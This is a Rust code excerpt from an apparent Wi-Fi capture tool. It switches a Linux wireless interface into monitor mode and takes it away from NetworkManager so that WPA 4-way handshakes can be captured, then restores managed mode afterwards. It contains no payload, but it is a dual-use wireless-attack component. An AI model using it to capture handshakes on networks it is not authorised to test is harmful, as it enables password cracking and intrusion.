/// RAII guard that switches the interface to monitor mode on Linux via
/// ip/iw (libpcap's rfmon is unreliable on mac80211) and restores managed
/// mode when dropped.
///
/// Crucially, it first tells NetworkManager to stop managing the interface.
/// This is the #1 reason capture "silently" fails on Linux: NetworkManager /
/// wpa_supplicant keep the card in managed mode and change its channel, so the
/// 4-way handshake is never seen even while a client reconnects.
#[cfg(target_os = "linux")]
struct LinuxMonitorGuard {
    interface: String,
    nm_released: bool,
}

#[cfg(target_os = "linux")]
impl LinuxMonitorGuard {
    fn enter(interface: &str, log: &Arc<dyn Fn(&str) + Send + Sync>) -> Self {
        // Returns (success, stderr) so failures can be reported.
        let run = |args: &[&str]| -> (bool, String) {
            match Command::new(args[0]).args(&args[1..]).output() {
                Ok(o) => (
                    o.status.success(),
                    String::from_utf8_lossy(&o.stderr).trim().to_string(),
                ),
                Err(e) => (false, e.to_string()),
            }
        };

        // 0. Make sure the radio isn't soft-blocked.
        let _ = run(&["rfkill", "unblock", "wifi"]);

        // 1. Ask NetworkManager to release this interface (best-effort). This
        //    stops it from yanking the card back to managed mode / hopping it.
        let (nm_released, _) = run(&["nmcli", "device", "set", interface, "managed", "no"]);
        if nm_released {
            log("✓ NetworkManager released the interface");
        } else {
            log("ℹ️ NetworkManager not managing this interface (or nmcli absent) — continuing");
        }

        // 2. Enter monitor mode: down → set type monitor → up.
        let (down_ok, down_err) = run(&["ip", "link", "set", "dev", interface, "down"]);
        let (mon_ok, mon_err) = run(&["iw", "dev", interface, "set", "type", "monitor"]);
        let (up_ok, up_err) = run(&["ip", "link", "set", "dev", interface, "up"]);

        if down_ok && mon_ok && up_ok {
            log("✓ Monitor mode enabled (ip/iw)");
        } else {
            let detail = [down_err, mon_err, up_err]
                .into_iter()
                .filter(|s| !s.is_empty())
                .collect::<Vec<_>>()
                .join("; ");
            log(&format!(
                "⚠️ Monitor mode setup failed (down:{down_ok} monitor:{mon_ok} up:{up_ok}). \
                 Run with sudo, make sure the adapter supports monitor mode (`iw list` → \
                 'Supported interface modes: monitor'), and that `ip`/`iw` are installed. {detail}"
            ));
        }

        Self {
            interface: interface.to_string(),
            nm_released,
        }
    }
}

#[cfg(target_os = "linux")]
impl Drop for LinuxMonitorGuard {
    fn drop(&mut self) {
        let run = |args: &[&str]| {
            let _ = Command::new(args[0]).args(&args[1..]).output();
        };
        run(&["ip", "link", "set", "dev", &self.interface, "down"]);
        run(&["iw", "dev", &self.interface, "set", "type", "managed"]);
        run(&["ip", "link", "set", "dev", &self.interface, "up"]);
        // Hand the interface back to NetworkManager if we took it away.
        if self.nm_released {
            run(&["nmcli", "device", "set", &self.interface, "managed", "yes"]);
        }
    }
}
